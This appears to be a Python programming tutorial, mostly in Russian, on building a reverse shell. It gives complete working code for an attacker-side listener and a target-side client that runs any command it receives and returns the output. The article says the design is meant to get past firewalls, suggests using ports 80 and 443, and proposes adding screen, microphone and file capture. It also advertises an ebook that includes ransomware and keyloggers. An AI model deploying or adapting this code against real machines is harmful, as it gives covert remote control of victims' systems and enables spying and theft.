# [How to Create a Reverse Shell in Python](https://www.thepythoncode.com/article/create-reverse-shell-python)
You don't need to install anything.
- To run the server, simply write:
    ```
    python server.py
    ```
    **Output:**
    ```
    Listening as 0.0.0.0:5003 ...
    ```
- Running the client (target machine) that connects to 192.168.1.104 (server's IP Address) :
    ```
    python client.py 192.168.1.104
    ```
- The server will get notified once a client is connected.
##
# [[] / []]()
Существует множество способов получить контроль над скомпрометированной системой. Обычной практикой является получение доступа к интерактивной оболочке, что позволяет попытаться получить полный контроль над операционной системой. Однако большинство основных брандмауэров блокируют прямые удаленные подключения. Одним из способов обойти это является использование обратных оболочек.

Обратная оболочка — это программа, которая выполняет локальные команды cmd.exe (для Windows) или bash/zsh (для Unix-подобных) и отправляет выходные данные на удаленную машину. С помощью обратной оболочки целевая машина инициирует соединение с машиной злоумышленника, а машина злоумышленника прослушивает входящие соединения на указанном порту; это позволит обойти брандмауэры.

Основная идея кода, который мы будем реализовывать, заключается в том, что машина злоумышленника будет продолжать прослушивать соединения. Как только клиент (или целевая машина) подключается, сервер отправляет команды оболочки на целевой компьютер и ожидает выходных результатов.

Связанные с: Как использовать хэш-алгоритмы в Python с помощью hashlib.

Серверная часть
Для начала начнем с сервера (кода злоумышленника):

import socket

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"
# create a socket object
s = socket.socket()
Обратите внимание, что я использовал 0.0.0.0 в качестве IP-адреса сервера, это означает все IPv4-адреса на локальном компьютере. Вы можете задаться вопросом, почему мы не используем только наш локальный IP-адрес или localhost или 127.0.0.1? Ну, если сервер имеет два IP-адреса, скажем, 192.168.1.101 в сети и 10.0.1.1 в другой, и сервер прослушивает 0.0.0.0, то он будет доступен на обоих этих IP-адресах.

Затем мы указали некоторые переменные и инициировали TCP-сокет. Обратите внимание, что я использовал 5003 в качестве TCP-порта, не стесняйтесь выбирать любой порт выше 1024; просто убедитесь, что он не используется, и вы должны использовать его с обеих сторон (т. Е. Сервер и клиент).

Однако вредоносные обратные оболочки обычно используют популярный порт 80 (т.е. HTTP) или 443 (т.е. HTTPS), это позволит ему обойти ограничения брандмауэра целевого клиента, не стесняйтесь менять его и пробовать!

Теперь давайте привяжем этот сокет, который мы только что создали, к нашему IP-адресу и порту:

# bind the socket to all IP addresses of this host
s.bind((SERVER_HOST, SERVER_PORT))
Связанные с: Создание более 35 этических хакерских скриптов и инструментов с помощью Python EBook

Прослушивание соединений:

s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
Если какой-либо клиент попытается подключиться к серверу, нам нужно принять его:

# accept any connections attempted
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")
Функция accept() ожидает входящего соединения и возвращает новый сокет, представляющий соединение (client_socket) и адрес (IP и порт) клиента.

Теперь приведенный ниже код будет выполняться только в том случае, если пользователь подключен к серверу; получим сообщение от клиента, содержащее текущий рабочий каталог клиента:

# receiving the current working directory of the client
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)
Обратите внимание, что перед отправкой нам нужно закодировать сообщение в байты, и мы должны отправить сообщение, используя client_socket, а не сокет сервера.

Теперь давайте начнем наш основной цикл, который отправляет команды оболочки и извлекает результаты, а также печатает их:

while True:
    # get the command from prompt
    command = input(f"{cwd} $> ")
    if not command.strip():
        # empty command
        continue
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # retrieve command results
    output = client_socket.recv(BUFFER_SIZE).decode()
    # split command output and current directory
    results, cwd = output.split(SEPARATOR)
    # print output
    print(results)
В приведенном выше коде мы запрашиваем у пользователя сервера (т.е. злоумышленника) команду, которую он хочет выполнить на клиенте; мы отправляем эту команду клиенту и ожидаем, что выходные данные команды будут напечатаны на консоли.

Обратите внимание, что мы разбиваем выходные данные на результаты команд и текущий рабочий каталог. Это связано с тем, что клиент будет отправлять оба этих сообщения за одну операцию отправки.

Если команда «exit», просто выйдите из цикла и закройте соединения.

Связанные с: Как создать приложение чата на Python.

Клиентская сторона
Давайте теперь посмотрим код клиента, откроем новый файл и напишем:

import socket
import os
import subprocess
import sys

SERVER_HOST = sys.argv[1]
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"
Выше мы устанавливаем SERVER_HOST для передачи из аргументов командной строки, это IP-адрес или хост серверной машины. Если вы находитесь в локальной сети, то вы должны знать частный IP-адрес сервера с помощью команды ipconfig в Windows и ifconfig в Linux.

Обратите внимание, что если вы тестируете оба кода на одной машине, вы можете установить SERVER_HOST на 127.0.0.1, и он будет работать просто отлично.

Создадим сокет и подключимся к серверу:

# create the socket object
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))
Помните, что сервер ожидает текущий рабочий каталог клиента сразу после подключения. Давайте тогда отправим его:

# get the current directory
cwd = os.getcwd()
s.send(cwd.encode())
Мы использовали функцию getcwd() из модуля os, эта функция возвращает текущий рабочий каталог. Например, если вы выполните этот код на рабочем столе, он вернет абсолютный путь к рабочему столу.

Перейдя в основной цикл, мы сначала получаем команду от сервера, выполняем ее и отправляем результат обратно. Вот код для этого:

while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    if splited_command[0].lower() == "cd":
        # cd command, change directory
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e)
        else:
            # if operation is successful, empty message
            output = ""
    else:
        # execute the command and retrieve the results
        output = subprocess.getoutput(command)
    # get the current working directory as output
    cwd = os.getcwd()
    # send the results back to the server
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())
# close client connection
s.close()
Во-первых, мы получаем команду с сервера с помощью метода recv() на объекте socket, затем проверяем, является ли это командой cd, если это так, то мы используем функцию os.chdir() для изменения каталога, потому что subprocess.getoutput() порождает свой собственный процесс и не изменяет каталог в текущем процессе Python.

После этого, если это не команда cd, то мы просто используем функцию subprocess.getoutput() для получения выходных данных выполненной команды.

Наконец, мы готовим наше сообщение, содержащее выходные данные команды и рабочий каталог, а затем отправляем его.

ПОЛУЧИТЕ СКИДКУ -10%: Создайте более 35 этических хакерских скриптов и инструментов с помощью электронной книги Python.

Результаты
Хорошо, мы закончили писать код для обеих сторон. Давайте запустим их. Сначала вам нужно запустить сервер для прослушивания этого порта, а затем запустить клиент после этого.

Ниже приведен снимок экрана, когда я запустил сервер и создал экземпляр нового клиентского соединения, а затем выполнил команду demo dir:

Запуск обратной оболочки в Python

И это была моя команда запуска на стороне клиента:

Выполнение клиентского кодаНевероятно, не правда ли? Можно выполнить любую команду оболочки, доступную в этой операционной системе.

Обратите внимание, что я использовал 127.0.0.1 для запуска обеих сторон на одной машине, но вы можете сделать это удаленно в локальной сети или Интернете.

Заключение
Вот несколько идей по расширению этого кода:

Используйте встроенный модуль многопоточности, чтобы сервер мог принимать несколько клиентских подключений одновременно.
Добавьте пользовательскую команду, которая получает информацию о системе и оборудовании с помощью стороннего модуля psutil. Ознакомьтесь с этим туториалом: Как получить информацию об оборудовании и системе в Python.
Добавляйте команды загрузки и выгрузки для загрузки и отправки файлов из/в клиент. Проверьте это: Как передавать файлы в сети с помощью сокетов в Python.
Выполните пользовательскую команду для записи экрана клиента, а затем загрузите записанное видео. Из этого туториала Вы узнаете, как сделать скрин-рекордер на Python.
Добавьте еще одну команду для записи звука клиента на микрофон по умолчанию. Ознакомьтесь с этим руководством.
И многое другое! Есть бесконечные возможности. Единственным ограничением здесь является ваша фантазия!
В нашей электронной книге «Этический взлом с Python» мы создали продвинутую обратную оболочку, которая имеет все функции, упомянутые выше; он может захватывать экран и микрофон целевой машины, загружать и загружать любой файл и многие другие функции. Мы также создали другие вредоносные программы, такие как программы-вымогатели и кейлоггеры. Убедитесь, что вы проверили это здесь, если вы заинтересованы!

Кроме того, в Linux есть утилита под названием netcat, где вы можете создавать обратные оболочки. Ознакомьтесь с этим учебником, который поможет вам настроить обратные оболочки в Linux.

В заключение, обратная оболочка обычно не предназначена для того, чтобы быть вредоносным кодом. Мы можем использовать его в законных целях; например, его можно использовать для удаленного управления компьютерами.